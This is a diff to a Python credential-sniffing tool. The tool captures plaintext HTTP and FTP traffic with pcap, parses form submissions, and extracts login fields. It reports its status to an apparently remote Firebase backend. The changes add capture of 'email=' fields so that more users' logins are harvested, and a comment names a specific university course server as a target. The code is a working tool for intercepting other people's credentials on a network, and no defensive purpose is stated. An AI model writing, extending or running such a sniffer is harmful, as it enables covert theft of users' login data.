@@ -19,15 +19,11 @@ class Sniffer(object):
 
         self._firebase = firebase.FirebaseApplication(settings.FIREBASE_URL,
                                                       None)
-        # TODO:
-        # Need to check firebase data first
-        # if status is "ON" exit the sniffer
-
         # Status update
         self._firebase.patch('/status', {"status": "ON"})
 
-        # pattern = 'tcp and dst port 80 or dst port 21 or dst port 110'
         pattern = 'tcp and dst port 80 or dst port 21'
+        # pattern = 'tcp and dst port 80 or dst port 21 or dst port 110'
 
         self.pc = pcap.pcap(kwargs['interface'])
         self.pc.setfilter(pattern)
@@ -102,6 +98,9 @@ class Sniffer(object):
         elif data.get('txtAccount'):
             self.all_user_info[self.info_counter].update(
                 {'login': data.get('txtAccount')[0]})
+        elif data.get('email'):
+            self.all_user_info[self.info_counter].update(
+                {'login': data.get('email')[0]})
         else:
             self.all_user_info[self.info_counter].update({'login': None})
 
@@ -192,6 +191,11 @@ class Sniffer(object):
             self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                                  socket.inet_ntoa(ip_pkt.dst),
                                  tcp_pkt.dport, eth_pkt.src)
+        elif 'email=' in tcp_pkt.data:
+            qs_d = urlparse.parse_qs(tcp_pkt.data)
+            self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
+                                 socket.inet_ntoa(ip_pkt.dst),
+                                 tcp_pkt.dport, eth_pkt.src)
         else:
             return
         # Moocs dst IP 140.114.60.144
@@ -201,14 +205,14 @@ class Sniffer(object):
     def loop(self):
         while True:
             result = self._firebase.get('/status', None)
-            if result['status'] == 'ON':
+            if result.get('status') == 'ON':
                 try:
                     for ts, buf in self.pc:
                         eth = dpkt.ethernet.Ethernet(buf)
                         ip = eth.data
                         tcp = ip.data
                         if len(tcp.data) > 0:
-                            print 'Packet in dst port number', tcp.dport
+                            # print 'Packet in dst port number', tcp.dport
                             # make sure the pattern is correct
                             if tcp.dport == 80:
                                 self._get_http_payload(eth, ip, tcp)
@@ -221,8 +225,6 @@ class Sniffer(object):
                     nrecv, ndrop, nifdrop = self.pc.stats()
                     print '\n%d packets received by filter' % nrecv
                     print '%d packets dropped by kernel' % ndrop
-                    # print 'All user info: '
-                    # pprint(self.all_user_info)
                     break
                 except (NameError, TypeError):
                     # print "No packet"
